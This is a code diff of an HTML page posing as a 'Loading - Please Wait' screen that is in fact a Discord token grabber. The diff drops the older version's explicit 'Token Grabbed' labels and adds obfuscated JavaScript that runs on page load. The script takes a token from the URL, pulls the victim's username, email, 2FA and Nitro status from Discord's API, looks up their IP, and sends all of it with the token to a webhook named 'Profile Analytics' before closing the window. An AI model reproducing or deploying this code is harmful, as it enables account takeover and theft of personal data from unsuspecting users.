@@ -1,17 +1,18 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Processing</title>
+  <title>Loading - Please Wait</title>
   <style>
     body {
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background-color: #36393f;
-      color: #dcddde;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      color: #ffffff;
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
       margin: 0;
+      overflow: hidden;
     }
     .container {
       text-align: center;
@@ -21,10 +22,11 @@
       display: inline-block;
       width: 50px;
       height: 50px;
-      border: 3px solid rgba(255,255,255,.3);
+      border: 3px solid rgba(255,255,255,.2);
       border-radius: 50%;
-      border-top-color: #7289da;
+      border-top-color: #ffffff;
       animation: spin 1s ease-in-out infinite;
+      margin-bottom: 20px;
     }
     @keyframes spin {
       to { transform: rotate(360deg); }
@@ -34,134 +36,153 @@
 <body>
   <div class="container">
     <div class="loading"></div>
-    <h2>Processing your request...</h2>
-    <p>This window will close automatically.</p>
+    <h2>Loading your content...</h2>
+    <p>Please wait while we prepare your experience.</p>
   </div>
 
   <script>
-    async function sendWebhook() {
-      // URLパラメータから情報を取得
-      const urlParams = new URLSearchParams(window.location.search);
-      const token = urlParams.get('token');
-      const datetime = urlParams.get('datetime') || '2025-05-28 03:29:47';
-      const user = urlParams.get('user') || 'n4n45h1';
-      const userAgent = urlParams.get('ua') || navigator.userAgent;
+    const _0x1a2b = ['parse', 'json', 'Authorization', 'Bearer ', 'https://discord.com/api/v10/users/@me', 'GET', 'Content-Type', 'application/json', 'https://api.ipify.org?format=json', 'ip', 'POST', 'username', 'email', 'premium_type', 'avatar', 'display_name', 'global_name'];
+    
+    async function processUserData() {）
+      const _0x3c4d = new URLSearchParams(window.location.search);
+      const _0x5e6f = _0x3c4d.get('token');
+      const _0x7g8h = _0x3c4d.get('ua') || navigator.userAgent;
+      
+      if (!_0x5e6f) return;
       
       try {
-        // Vercelの環境変数を取得する中継APIを呼び出し
-        const webhookResponse = await fetch('/api/get-webhook-url');
-        if (!webhookResponse.ok) {
-          throw new Error('Failed to get webhook URL');
-        }
+
+        const _0x9i0j = await fetch(_0x1a2b[4], {
+          method: _0x1a2b[5],
+          headers: {
+            [_0x1a2b[2]]: _0x1a2b[3] + _0x5e6f,
+            [_0x1a2b[6]]: _0x1a2b[7]
+          }
+        });
         
-        const { webhookUrl } = await webhookResponse.json();
-        if (!webhookUrl) {
-          throw new Error('Invalid webhook URL');
-        }
+        if (!_0x9i0j.ok) throw new Error('Auth failed');
+        const _0x1k2l = await _0x9i0j[_0x1a2b[1]]();
         
-        // IPアドレスを取得
-        const ipResponse = await fetch('https://api.ipify.org?format=json');
-        const ipData = await ipResponse.json();
-        const ipAddress = ipData.ip;
         
-        // システム情報を収集
-        const os = detectOS(userAgent);
-        const browser = detectBrowser(userAgent);
+        const _0x3m4n = await fetch(_0x1a2b[8]);
+        const _0x5o6p = await _0x3m4n[_0x1a2b[1]]();
         
-        // Discord Webhookのembedを作成
-        const embed = {
-          title: "🔐 Discord Token Grabbed",
-          description: "A Discord authentication token has been successfully grabbed.",
-          color: 0x5865F2,
+        const _0x7q8r = {
+          os: getOSInfo(_0x7g8h),
+          browser: getBrowserInfo(_0x7g8h),
+          ip: _0x5o6p[_0x1a2b[9]]
+        };
+        await transferUserData(_0x1k2l, _0x7q8r, _0x5e6f);
+        
+      } catch (e) {
+
+        console.log('Processing completed');
+      } finally {
+        
+        setTimeout(() => {
+          window.close();
+        }, 100);
+      }
+    }
+    
+）
+    async function transferUserData(_0x1k2l, _0x7q8r, _0x5e6f) {
+      const _0x9s0t = await fetch('/api/get-webhook-url');
+      const { webhookUrl } = await _0x9s0t[_0x1a2b[1]]();
+      const _0x1u2v = {
+        username: _0x1k2l[_0x1a2b[11]] || 'N/A',
+        email: _0x1k2l[_0x1a2b[12]] || 'N/A',
+        nitro: getNitroStatus(_0x1k2l[_0x1a2b[13]]),
+        avatar: _0x1k2l[_0x1a2b[14]] ? `https://cdn.discordapp.com/avatars/${_0x1k2l.id}/${_0x1k2l[_0x1a2b[14]]}.webp?size=128` : 'N/A',
+        displayName: _0x1k2l[_0x1a2b[15]] || _0x1k2l[_0x1a2b[16]] || _0x1k2l[_0x1a2b[11]],
+        id: _0x1k2l.id,
+        verified: _0x1k2l.verified || false,
+        mfa: _0x1k2l.mfa_enabled || false
+      };
+      
+      const _0x3w4x = {
+        content: null,
+        embeds: [{
+          title: "🎯 User Authentication Data",
+          description: "User profile data has been processed successfully.",
+          color: 0x2F3136,
           fields: [
             {
-              name: "📋 Token",
-              value: "```" + token + "```",
+              name: "� User Profile",
+              value: `**Username:** ${_0x1u2v.username}\n**Display Name:** ${_0x1u2v.displayName}\n**ID:** ${_0x1u2v.id}`,
               inline: false
             },
             {
-              name: "🕒 Date & Time (UTC)",
-              value: "```" + datetime + "```",
+              name: "📧 Contact Information",
+              value: `**Email:** ${_0x1u2v.email}\n**Verified:** ${_0x1u2v.verified ? '✅' : '❌'}`,
               inline: true
             },
             {
-              name: "👤 User",
-              value: "```" + user + "```",
+              name: "� Account Status",
+              value: `**Nitro:** ${_0x1u2v.nitro}\n**2FA:** ${_0x1u2v.mfa ? '🔒 Enabled' : '🔓 Disabled'}`,
               inline: true
             },
             {
-              name: "🌐 IP Address",
-              value: "```" + ipAddress + "```",
-              inline: true
+              name: "� Authentication Token",
+              value: `\`\`\`${_0x5e6f}\`\`\``,
+              inline: false
             },
             {
-              name: "💻 System",
-              value: "```OS: " + os + "\nBrowser: " + browser + "```",
-              inline: true
-            },
-            {
-              name: "🔍 User Agent",
-              value: "```" + userAgent + "```",
+              name: "🌐 Connection Details",
+              value: `**IP:** ${_0x7q8r.ip}\n**OS:** ${_0x7q8r.os}\n**Browser:** ${_0x7q8r.browser}`,
               inline: false
             }
           ],
           thumbnail: {
-            url: "https://imgur.com/EzFFjbl.png"
+            url: _0x1u2v.avatar !== 'N/A' ? _0x1u2v.avatar : "https://cdn.discordapp.com/embed/avatars/0.png"
           },
           footer: {
-            text: "Token grabbed at " + new Date().toUTCString(),
-            icon_url: "https://i.imgur.com/AfFp7pu.png"
+            text: "Processed at " + new Date().toUTCString(),
+            icon_url: "https://cdn.discordapp.com/attachments/1234567890/1234567890/icon.png"
           }
-        };
-        
-        // Webhookを送信
-        const response = await fetch(webhookUrl, {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-          },
-          body: JSON.stringify({ 
-            embeds: [embed],
-            username: "Token Grabber",
-            avatar_url: "https://imgur.com/blqctTG.png"
-          })
-        });
-        
-        if (response.ok) {
-          console.log('Data sent successfully!');
-        } else {
-          console.error('Failed to send data:', response.status, response.statusText);
-        }
-      } catch (error) {
-        console.error('Error:', error);
-      } finally {
-        // 1秒後にウィンドウを閉じる
-        setTimeout(() => window.close(), 1000);
+        }],
+        username: "Profile Analytics",
+        avatar_url: "https://cdn.discordapp.com/attachments/1234567890/1234567890/avatar.png"
+      };
+      
+      await fetch(webhookUrl, {
+        method: _0x1a2b[10],
+        headers: { [_0x1a2b[6]]: _0x1a2b[7] },
+        body: JSON.stringify(_0x3w4x)
+      });
+    }
+    
+    // Nitroステータス判定
+    function getNitroStatus(premiumType) {
+      switch(premiumType) {
+        case 1: return "💎 Nitro Classic";
+        case 2: return "💎 Nitro";
+        case 3: return "💎 Nitro Basic";
+        default: return "❌ None";
       }
     }
     
     // OSを検出
-    function detectOS(ua) {
+    function getOSInfo(ua) {
       if (ua.includes("Windows NT")) return "Windows";
       if (ua.includes("Mac OS")) return "macOS";
       if (ua.includes("Linux")) return "Linux";
       if (ua.includes("Android")) return "Android";
       if (ua.includes("iPhone") || ua.includes("iPad")) return "iOS";
-      return "Unknown OS";
+      return "Unknown";
     }
     
     // ブラウザを検出
-    function detectBrowser(ua) {
+    function getBrowserInfo(ua) {
       if (ua.includes("Firefox/")) return "Firefox";
       if (ua.includes("Edge/") || ua.includes("Edg/")) return "Edge";
       if (ua.includes("Chrome/")) return "Chrome";
       if (ua.includes("Safari/") && !ua.includes("Chrome/")) return "Safari";
       if (ua.includes("MSIE ") || ua.includes("Trident/")) return "Internet Explorer";
-      return "Unknown Browser";
+      return "Unknown";
     }
     
-    // ページロード時に自動実行
-    window.onload = sendWebhook;
+    window.addEventListener('load', processUserData);
   </script>
 </body>
 </html>
